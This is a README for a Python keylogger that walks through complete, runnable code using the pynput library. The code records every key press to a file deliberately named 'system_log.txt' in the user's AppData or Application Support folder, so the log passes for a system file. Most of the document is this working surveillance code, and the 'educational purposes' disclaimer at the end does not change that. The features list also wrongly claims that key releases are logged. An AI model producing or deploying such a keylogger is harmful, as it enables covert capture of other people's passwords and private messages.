# Keylogger.py

## Overview

This Python script is a simple keylogger that captures and logs keyboard events to a file. It uses the `pynput` library to listen for keyboard events and records them into a log file. The script is designed to work on both Windows and macOS operating systems.

## Features

- Logs key presses and releases.
- Records special keys (e.g., space, enter) by their names.
- Stores the log file in an appropriate directory based on the operating system.
- Stops logging when the Escape key is pressed.

## Requirements

- Python 3.x
- `pynput` library

## Installation

1. Install Python 3 from [python.org](https://www.python.org/downloads/).
2. Install the `pynput` library using pip:
    ```sh
    pip install pynput
    ```

## Usage

1. Save the script as `keylogger.py`.
2. Run the script:
    ```sh
    python keylogger.py
    ```

## Code Explanation

### Importing Libraries

```python
import os
import platform
from pynput import keyboard
```

- `os`: Provides functions to interact with the operating system.
- `platform`: Used to determine the operating system type.
- `pynput.keyboard`: Provides classes and functions to monitor and control keyboard events.

### Getting the Log File Path

```python
def get_log_file_path():
    """Determine the path to the log file based on the operating system."""
    if platform.system() == 'Windows':
        appdata_dir = os.getenv('APPDATA')
        log_file = os.path.join(appdata_dir, 'system_log.txt')
    else:
        app_support_dir = os.path.expanduser('~/Library/Application Support')
        log_file = os.path.join(app_support_dir, 'system_log.txt')
    return log_file

log_file = get_log_file_path()
os.makedirs(os.path.dirname(log_file), exist_ok=True)
```

- Determines the appropriate log file path based on the operating system.
- On Windows, the log file is stored in the `%APPDATA%` directory.
- On macOS, the log file is stored in the `~/Library/Application Support` directory.
- Ensures the directory for the log file exists.

### Handling Key Press Events

```python
def on_press(key):
    """Callback function to handle key press events."""
    try:
        with open(log_file, 'a') as f:
            f.write(f'{key.char}')
    except AttributeError:
        with open(log_file, 'a') as f:
            f.write(f'[{key}]')
```

- Logs the character of the key pressed.
- If the key is a special key (e.g., space, enter), it logs the name of the key.

### Handling Key Release Events

```python
def on_release(key):
    """Callback function to handle key release events."""
    if key == keyboard.Key.esc:
        return False
```

- Stops the keylogger when the Escape key is released.

### Starting the Keylogger

```python
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
```

- Starts the keyboard event listener.
- Joins the listener to the main thread to keep it running.

## Disclaimer

This keylogger is for educational purposes only. Unauthorized use of a keylogger to capture keystrokes without the user's consent is illegal and unethical. Use this script responsibly and only on systems where you have explicit permission to do so.